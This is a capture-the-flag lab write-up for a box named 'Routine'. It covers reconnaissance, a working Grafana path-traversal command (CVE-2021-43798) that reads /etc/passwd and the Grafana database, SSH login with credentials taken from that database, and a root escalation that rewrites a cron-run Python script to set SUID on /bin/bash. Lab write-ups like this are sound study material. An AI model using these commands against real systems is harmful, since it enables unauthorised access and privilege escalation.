# Routine

## Routine - I

This box is vulnerable, and uses a mysql plugin.

Nmap Scan

```
Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-29 23:20 +0800
Nmap scan report for routine.dlinkrouter.local (172.16.1.121)
Host is up (0.057s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 10.2p1 Ubuntu 2ubuntu3.2 (Ubuntu Linux; protocol 2.0)
3000/tcp open  http    Grafana http
MAC Address: 08:00:27:4C:8D:08 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.36 seconds
```

SSH and HTTP open. HTTP had a Grafana login page

<img src="../../.gitbook/assets/image-7 (1).png" alt="" width="563">

Did some fuzzing with `ffuf -w /usr/share/wordlists/dirb/common.txt -u http://172.16.1.121:3000/FUZZ -fs 29`

```
api                     [Status: 401, Size: 32, Words: 4, Lines: 4, Duration: 17ms]
apis                    [Status: 401, Size: 32, Words: 4, Lines: 4, Duration: 46ms]
login                   [Status: 200, Size: 28034, Words: 1924, Lines: 192, Duration: 138ms]
org                     [Status: 302, Size: 24, Words: 2, Lines: 3, Duration: 93ms]
public                  [Status: 302, Size: 31, Words: 2, Lines: 3, Duration: 49ms]
robots.txt              [Status: 200, Size: 26, Words: 3, Lines: 3, Duration: 82ms]
signup                  [Status: 200, Size: 27985, Words: 1924, Lines: 192, Duration: 84ms]
:: Progress: [4614/4614] :: Job [1/1] :: 684 req/sec :: Duration: [0:00:06] :: Errors: 0 ::

```

The footer of the login page revealed the it was Grafana v8.3.0 (914fcedb72), which after searching around had a path traversal CVE (https://sahruldotid.medium.com/understanding-grafana-unauthenticated-path-travesal-cve-2021-43798-508182d08bca)

`public/plugins/graph/../../../../../../../../etc/passwd` dumps the /etc/passwd

I maanged to get the grafana.db with this command:

`curl --path-as-is "http://172.16.1.121:3000/public/plugins/graph/../../../../../../../../var/lib/grafana/grafana.db" -o grafana.db`

In the db, we get some creds:

![](<../../.gitbook/assets/image-8 (1).png>)

After trying the credentials with SSH, I finally get a hit with `tellytubby:V4lor4nt-Anti-cHEAT`

First Flag:

```
tellytubby@routine:~$ ls
Desktop  Documents  Downloads  local.txt
tellytubby@routine:~$ cat local.txt 
OWASPKL{496d5373e7501c9aab3b2658bbad4c02}
```

## Routine - II

Now time to escalate to root. First check permissions:

```
tellytubby@routine:~$ ls /home
kdjebat  ratusrempah  routine  tellytubby  yunacat

tellytubby@routine:~$ sudo -l
sudo: Sorry, user tellytubby may not run sudo on routine.
```

I found a `userbackup.py` in the Downloads:

```python
#!/usr/bin/env python3
# User Backup Module
# Called by backup.sh

import os
import shutil
from datetime import datetime

backup_dir = "/tmp/userbackup"
timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")

os.makedirs(backup_dir, exist_ok=True)

users = os.listdir("/home")
for user in users:
    src = f"/home/{user}"
    dst = f"{backup_dir}/{user}_{timestamp}"
    try:
        shutil.copytree(src, dst)
        print(f"[+] Backed up {user}")
    except Exception as e:
        print(f"[-] Failed to backup {user}: {e}")
```

There are a bunch of backups in the dir mentioned in the script. However, we can;t access any of them:

![](<../../.gitbook/assets/image-9 (1).png>)

In the comments, it mentioned that this script in called by `backup.sh` . I found the script in `/opt`

```bash
#!/bin/bash
# System Backup Script
# Runs daily to backup user data

echo "[*] Starting backup process..."
echo "[*] Backing up /home directories..."
tar -czf /tmp/home_backup.tar.gz /home/ 2>/dev/null
echo "[*] Running user backup module..."
python3 /home/tellytubby/Downloads/userbackup.py
echo "[*] Backup complete."
```

I also looked at cron jobs and found this:

```
tellytubby@routine:/opt$ ls -la /etc/cron.*
/etc/cron.d:
total 32
drwxr-xr-x   2 root root  4096 May 24 14:57 .
drwxr-xr-x 131 root root 12288 May 24 15:10 ..
-rw-r--r--   1 root root   102 Nov  5  2025 .placeholder
-rw-r--r--   1 root root   224 Oct 31  2025 anacron
-rw-r--r--   1 root root    32 May 24 15:02 backup
-rw-r--r--   1 root root   188 Feb 13 20:17 e2scrub_all
...


tellytubby@routine:~/Downloads$ cat /etc/cron.d/backup
*/1 * * * * root /opt/backup.sh

```

The backup script is run by root every minute and that script calls the `userbackup.py` in our Downloads folder. I tried to rewrite userbackup.py to see if I can get shell as root.

```python
import os
os.system("chmod +s /bin/bash")
```

Waited for a minute and then ran `bash -p`. Gained root!

```
tellytubby@routine:~/Downloads$ bash -p
bash-5.3# whoami
root
bash-5.3# cd /root
bash-5.3# ls
proof.txt
bash-5.3# cat proof.txt
OWASPKL{b0f8c51049b9db31552bda1bd751940a}

```
